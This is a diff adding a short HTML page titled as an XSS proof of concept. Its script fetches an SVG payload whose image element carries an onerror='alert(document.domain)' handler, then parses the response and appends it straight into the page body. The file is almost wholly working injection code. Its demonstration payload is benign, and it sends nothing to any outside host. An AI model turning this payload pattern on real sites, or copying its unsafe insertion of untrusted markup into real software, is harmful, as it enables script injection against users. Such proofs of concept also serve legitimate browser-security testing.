@@ -1,0 +1,33 @@
+<html>
+<head>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        button { margin: 10px; }
+        .result { margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Document Implementation XSS PoC</h1>
+    <button id="execute">Click</button>
+    <div id="output" class="result"></div>
+    <script>
+        const output = document.getElementById('output');
+        const payload = `<svg xmlns='http://www.w3.org/2000/svg'><image href='' onerror='alert(document.domain)' /></svg>`;
+        function ExecuteXSS() {
+            output.innerHTML = '';
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'data:text/html;charset=utf-8,' + encodeURIComponent(payload), true); 
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    const responseDoc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
+                    output.innerHTML += '<strong>Method :</strong> XMLHttpRequest injected.<br>';
+                    document.body.appendChild(responseDoc.body.firstChild); 
+                }
+            };
+            xhr.send();
+        }
+        document.getElementById('execute').onclick = ExecuteXSS;
+    </script>
+</body>
+</html>
